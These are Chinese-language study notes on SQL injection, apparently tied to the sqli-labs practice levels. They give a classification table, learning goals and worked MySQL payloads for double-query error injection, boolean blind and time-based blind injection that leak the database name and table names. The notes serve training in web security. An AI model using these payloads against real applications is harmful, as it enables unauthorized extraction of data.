# SQL注入大型笔记
##总纲
###0x00 SQL注入分类

|      |      |                  |                    |                          |         | Level |
| ---- | ---- | ---------------- | ------------------ | ------------------------ | ------- | ----- |
| 1    | GET  | Error Based      |                    | Single Quotes            | String  | 1     |
| 2    | GET  | Error Based      |                    |                          | Integer | 1     |
| 3    | GET  | Error Based      |                    | Single Quotes with twist | String  | 1     |
| 4    | GET  | Error Based      |                    | Double Quotes            | String  | 1     |
| 5    | GET  | Double Injection |                    | Single Quotes            | String  | 1     |
| 6    | GET  | Double Injection |                    | Double Quotes            | String  | 1     |
| 7    | GET  | Dump into file   |                    | String                   | String  | 1     |
| 8    | GET  | Blind            | Boolian Based      | Single Quotes            |         | 1     |
| 9    | GET  | Blind            | Time Based         | Single Quotes            |         | 1     |
| 10   | GET  | Blind            | Time Based         | Double Quotes            |         | 2     |
| 11   | POST | Error Based      |                    | Single Quotes            | String  | 1     |
| 12   | POST | Error Based      |                    | Double Quotes with twist | String  | 1     |
| 13   | POST | Double Injection |                    | Single Quotes with twist | String  | 1     |
| 14   | POST | Double Injection |                    | Double Quotes With twist | String  |       |
| 15   | POST | Blind            | Boolian/Time Based | Single Quotes            | String  |       |
| 16   | POST | Blind            | Boolian/Time Based | Double Quotes            | String  |       |
| 17   | POST | Error Based      | Update Query       |                          | String  |       |
| 18   | POST | Header Injection | User Agent Field   | Error Based              |         |       |
| 19   | POST | Header Injection | Referer Field      | Error Based              |         |       |
| 20   | POST | Cookie Injection | User Agent Field   | Error Based              |         |       |
| 21   |      |                  |                    |                          |         |       |
| 22   |      |                  |                    |                          |         |       |
| 23   |      |                  |                    |                          |         |       |
| 24   |      |                  |                    |                          |         |       |
| 25   |      |                  |                    |                          |         |       |
| 26   |      |                  |                    |                          |         |       |
| 27   |      |                  |                    |                          |         |       |
| 28   |      |                  |                    |                          |         |       |
| 29   |      |                  |                    |                          |         |       |
| 30   |      |                  |                    |                          |         |       |
| 31   |      |                  |                    |                          |         |       |
| 32   |      |                  |                    |                          |         |       |
| 33   |      |                  |                    |                          |         |       |
| 34   |      |                  |                    |                          |         |       |
| 35   |      |                  |                    |                          |         |       |
| 36   |      |                  |                    |                          |         |       |
| 37   |      |                  |                    |                          |         |       |
| 38   |      |                  |                    |                          |         |       |
| 39   |      |                  |                    |                          |         |       |
| 40   |      |                  |                    |                          |         |       |
| 41   |      |                  |                    |                          |         |       |
| 42   |      |                  |                    |                          |         |       |
| 43   |      |                  |                    |                          |         |       |
| 44   |      |                  |                    |                          |         |       |
| 45   |      |                  |                    |                          |         |       |
| 46   |      |                  |                    |                          |         |       |
| 47   |      |                  |                    |                          |         |       |
| 48   |      |                  |                    |                          |         |       |
| 49   |      |                  |                    |                          |         |       |
| 50   |      |                  |                    |                          |         |       |
### 0x01 注入基本步骤

* 寻找可能的注入点
* 验证注入点
* 检查过滤
* 构造payload
* 手工，工具，脚本

### 0x02 学习目标

* 通过手工注入理解SQL注入原理
* 使用工具高效地发现和利用SQL注入漏洞
* 用脚本处理工具不能解决的问题

### 0x03 基础知识

* 基本SQL语句
* PHP等后端语言
* Python等脚本语言
* 网站基本结构
* 关系型数据库

### 0x04 拓展

* NoSQL数据库
* Java，Python，Node.js等其他后端语言
* 其他数据库
* 相同原理的XSS, XXE

## CheatSheet



##实战

### 基于错误的注入

单引号测试

双引号测试

###双注入

只显示注入成功和不显示

接下来我们将上面的成果用到前台注入测试一下，我们已经对后台的 Sql 语句进行了简单的
测试，Select * from table where id=”input” 那么我们的注入语句可以这样写入
Select * from table where id=”input and 攻击代码 --+” 现在我们来测试一下
" and 1 --+
将 1 替换成我们在 Mysql 中联系的语句
" and (select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))name from
information_schema.tables group by name) --+
" and (select 1 from (select count(*),concat(0x3a,0x3a,(select
database()),0x3a,0x3a,floor(rand()*2))name from information_schema.tables group by name)) --+
" AND (select 1 from (select count(*),concat(0x3a,0x3a,(select
database()),0x3a,0x3a,floor(rand()*2))name from information_schema.tables group by name)b)
--+
多刷新几次，直至出错
可以看到，跟我们之前联系的出错是一样的，这样我们就在前台得到了数据库里的敏感信息
爆出当前数据库的表名

基于布尔的盲注

' and (select ascii(substr(database(),1,1)) =88 )—+返回错误

' and (select ascii(substr(database(),1,1)) =115)--+ 返回正常

基于时间的盲注

之前我们猜测后台的 Sql 语句为 Select * from table where id = input
如果它成立的话，那我们测试 id=1 and sleep(10) -+ 前台页面应该会等待 10 秒钟才能成功加
载，那么我们试一下。
它并没有等待 10 秒钟，直接返回了结果，这说明我们的语句有错误，我们多测试几个语句
Id=1’ and sleep(10) --+
Id=1’) and sleep(10) --+
Id=1” and sleep(10) --+
Id=1”) and sleep(10) --+
其中 Id=1’ and sleep(10) --+的执行结果是我们预期的结果，所以我们修改 Sql 语句为
Select * from table where id = ‘input’ 这样我们就可以构造注入语句 Id=1’ and 攻击代码 --+
我们将后台测试的 sql 语句拿到前台测试
id=1' and (select if((select database())='security',sleep(10),NULL))--+
我们看到程序加载了 10 秒钟后正确返回，我们将更复杂的语句拿过来测试
id=1' and (select if(ascii(substr((select table_name from information_schema.tables where
table_schema=database() limit 0,1),1,1))=111,sleep(10),NULL))--+
程序直接返回，没有等待
id=1' and (select if(ascii(substr((select table_name from information_schema.tables where
table_schema=database() limit 0,1),1,1))=101,sleep(10),NULL))--+
等待 10 秒钟返回正常页面
我们可以根据我们想要获取的信息去构造我们的语句。
http://www.xmanblog.net/
26